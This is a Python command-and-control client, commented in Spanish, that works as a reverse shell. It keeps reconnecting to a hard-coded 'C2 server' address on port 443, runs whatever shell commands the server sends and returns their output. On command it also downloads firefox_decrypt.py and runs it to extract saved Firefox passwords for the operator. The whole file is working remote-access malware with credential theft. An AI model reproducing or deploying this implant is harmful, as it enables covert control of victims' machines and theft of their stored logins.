#!/usr/bin/env python3

import sys
import signal
import requests
import time
import os
import socket
import subprocess
import tempfile 

# --- Manejo de Ctrl + C ---
def def_handler(sig, frame):
    print(f"\n[!] Saliendo de la ejecución del cliente...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# --- Configuración del Cliente ---
SERVER_IP = "192.168.1.92" # IP del servidor C2
SERVER_PORT = 443
DOWNLOAD_DIR = tempfile.gettempdir() # Directorio temporal para descargas (ej. firefox_decrypt.py)

# --- Funciones de Comunicación Fiable ---
def reliable_send(s, data):
    """Envía datos de forma fiable (envía tamaño, luego datos)."""
    try:
        s.send(str(len(data)).encode().ljust(16))
        s.send(data)
        return True
    except socket.error:
        return False

def reliable_recv(s):
    """Recibe datos de forma fiable (recibe tamaño, luego datos)."""
    try:
        raw_length = s.recv(16).decode().strip()
        length = int(raw_length)

        data = b''
        while len(data) < length:
            packet = s.recv(4096) 
            if not packet: # Conexión cerrada
                break
            data += packet
        return data.decode(errors='ignore') # Ignora errores de decodificación
    except (socket.error, ValueError, IndexError):
        return None # Indica un problema o desconexión

# --- Función de Ejecución de Comandos ---
def run_command(command):
    """Ejecuta un comando en el sistema y devuelve su salida."""
    try:
        command_output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT, errors='ignore')
        return command_output
    except subprocess.CalledProcessError as e:
        return f"[!] Error al ejecutar comando: {e.output}"
    except Exception as e:
        return f"[!] Error inesperado al ejecutar comando: {e}"

# --- Función de Descarga ---
def download_firefox_decrypt():
    """Descarga 'firefox_decrypt.py' si no existe, en el directorio temporal."""
    script_path = os.path.join(DOWNLOAD_DIR, "firefox_decrypt.py")
    if os.path.exists(script_path):
        return True # Ya existe

    try:
        r = requests.get("https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py", timeout=10)
        r.raise_for_status() # Lanza error para códigos de estado HTTP incorrectos
        with open(script_path, "wb") as f:
            f.write(r.content)
        return True
    except requests.exceptions.RequestException:
        return False
    except Exception:
        return False

# --- Lógica Principal del Cliente ---
if __name__ == '__main__':
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Bucle de reconexión
    connected = False
    while not connected:
        try:
            print(f"[+] Intentando conectar a {SERVER_IP}:{SERVER_PORT}...")
            client_socket.connect((SERVER_IP, SERVER_PORT))
            connected = True
            print(f"[+] Conectado al servidor.")
        except socket.error:
            print(f"[!] Falló la conexión. Reintentando en 5 segundos...")
            time.sleep(5)
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Recrear socket
        except Exception:
            print(f"[!] Error inesperado durante la conexión. Reintentando en 5 segundos...")
            time.sleep(5)
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bucle de comandos principal
    while True:
        try:
            command = reliable_recv(client_socket) # Recibe el comando del servidor
            if command is None: # Servidor desconectado
                print("[!] Servidor desconectado. Intentando reconectar...")
                break # Sale del bucle de comandos

            if command == "exit":
                print("[+] Recibido comando 'exit'. Cerrando conexión...")
                break # Sale del bucle para cerrar el socket

            elif command.startswith("python firefox_decrypt.py"):
                if not download_firefox_decrypt():
                    reliable_send(client_socket, "[!] No se pudo ejecutar firefox_decrypt.py. Descarga fallida.")
                    continue 
                
                original_cwd = os.getcwd() # Guarda el directorio actual
                os.chdir(DOWNLOAD_DIR) # Cambia al directorio de descarga
                
                try:
                    command_output = run_command(command) # Ejecuta el comando completo
                finally:
                    os.chdir(original_cwd) # Vuelve al directorio original
                
                if not reliable_send(client_socket, command_output):
                    print("[!] Falló el envío de la salida del comando Firefox. Cliente desconectado.")
                    break

            else: # Ejecutar cualquier otro comando general
                command_output = run_command(command)
                if not reliable_send(client_socket, command_output):
                    print("[!] Falló el envío de la salida del comando. Cliente desconectado.")
                    break

        except socket.error:
            print(f"[!] Error de socket en el bucle principal. Intentando reconectar...")
            break 
        except Exception:
            print(f"[!] Error inesperado en el bucle principal.")
            

    client_socket.close() # Cierra el socket al salir del bucle principal
    print("[+] Conexión del cliente cerrada.")